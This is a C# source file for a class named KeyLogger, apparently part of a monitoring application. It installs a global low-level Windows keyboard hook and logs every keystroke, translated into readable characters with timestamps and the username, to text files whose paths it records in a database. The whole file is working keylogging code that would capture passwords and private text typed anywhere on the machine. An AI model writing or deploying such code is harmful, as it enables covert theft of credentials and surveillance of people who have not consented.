using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Apac.App.Monitoring;

public class KeyLogger : IDisposable
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private IntPtr _hookId = IntPtr.Zero;
    private LowLevelKeyboardProc _proc;
    private string _logFilePath = "";
    private readonly object _lockObj = new();
    private string _username = "";
    private readonly DatabaseManager _db;
    private int? _userId;
    private bool _logPerSession = false;

    private string _currentLogFile = "";
    private StreamWriter? _writer;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    public KeyLogger(DatabaseManager db, string logPath, bool logPerSession = true)
    {
        _db = db;
        _logFilePath = logPath;
        _logPerSession = logPerSession;
        Directory.CreateDirectory(logPath);
        _proc = HookCallback;
    }

    public void Start(string username, int? userId)
    {
        _username = username;
        _userId = userId;
        var datePart = DateTime.Now.ToString("yyyyMMdd");
        var userPart = string.IsNullOrEmpty(username) ? "system" : username;
        _currentLogFile = _logPerSession
            ? $"keylog_{datePart}_{userPart}_{DateTime.Now:HHmmss}.txt"
            : $"keylog_{datePart}_{userPart}.txt";

        var fullPath = Path.Combine(_logFilePath, _currentLogFile);
        _writer = new StreamWriter(fullPath, true, Encoding.UTF8) { AutoFlush = true };

        using var curProc = Process.GetCurrentProcess();
        using var curMod = curProc.MainModule;
        if (curMod != null)
            _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curMod.ModuleName), 0);
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
        {
            var vkCode = Marshal.ReadInt32(lParam);
            var keyName = GetKeyName((uint)vkCode);

            lock (_lockObj)
            {
                var entry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {_username}: {keyName}";
                try
                {
                    _writer?.WriteLine(entry);
                }
                catch { }
            }
        }
        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    private string GetKeyName(uint vkCode)
    {
        var ctrl = (GetKeyState(0x11) & 0x8000) != 0;
        var alt = (GetKeyState(0x12) & 0x8000) != 0;
        var shift = (GetKeyState(0x10) & 0x8000) != 0;

        var modifiers = new List<string>();
        if (ctrl) modifiers.Add("CTRL");
        if (alt) modifiers.Add("ALT");
        if (shift) modifiers.Add("SHIFT");

        var modifiersStr = modifiers.Count > 0 ? string.Join("+", modifiers) + "+" : "";

        return vkCode switch
        {
            0x08 => $"[BACKSPACE]",
            0x09 => $"[TAB]",
            0x0D => $"[ENTER]",
            0x1B => $"[ESC]",
            0x20 => $"[SPACE]",
            0x21 => $"[PGUP]",
            0x22 => $"[PGDN]",
            0x23 => $"[END]",
            0x24 => $"[HOME]",
            0x25 => $"[LEFT]",
            0x26 => $"[UP]",
            0x27 => $"[RIGHT]",
            0x28 => $"[DOWN]",
            0x2D => $"[INS]",
            0x2E => $"[DEL]",
            0x70 => $"[F1]",
            0x71 => $"[F2]",
            0x72 => $"[F3]",
            0x73 => $"[F4]",
            0x74 => $"[F5]",
            0x75 => $"[F6]",
            0x76 => $"[F7]",
            0x77 => $"[F8]",
            0x78 => $"[F9]",
            0x79 => $"[F10]",
            0x7A => $"[F11]",
            0x7B => $"[F12]",
            0xA0 => $"[LSHIFT]",
            0xA1 => $"[RSHIFT]",
            0xA2 => $"[LCTRL]",
            0xA3 => $"[RCTRL]",
            0xA4 => $"[LALT]",
            0xA5 => $"[RALT]",
            0x5B => $"[LWIN]",
            0x5C => $"[RWIN]",
            >= 0x30 and <= 0x39 when !shift => ((char)(vkCode)).ToString(),
            >= 0x30 and <= 0x39 when shift => (vkCode - 0x30) switch
            {
                1 => "!", 2 => "@", 3 => "#", 4 => "$", 5 => "%",
                6 => "^", 7 => "&", 8 => "*", 9 => "(", 0 => ")",
                _ => "?"
            },
            >= 0x41 and <= 0x5A => shift ? ((char)vkCode).ToString() : ((char)(vkCode + 32)).ToString(),
            _ => modifiers.Count > 0 ? $"{modifiersStr}[VK:{vkCode}]" : $"[VK:{vkCode}]"
        };
    }

    public string GetCurrentLogPath() => Path.Combine(_logFilePath, _currentLogFile);

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
        try
        {
            _writer?.Close();
            _writer?.Dispose();
            _writer = null;
        }
        catch { }

        if (!string.IsNullOrEmpty(_currentLogFile))
        {
            var fullPath = Path.Combine(_logFilePath, _currentLogFile);
            _db.InsertLog("keylog", fullPath, _userId, _username, null);
        }
    }

    public void Dispose() => Stop();
}
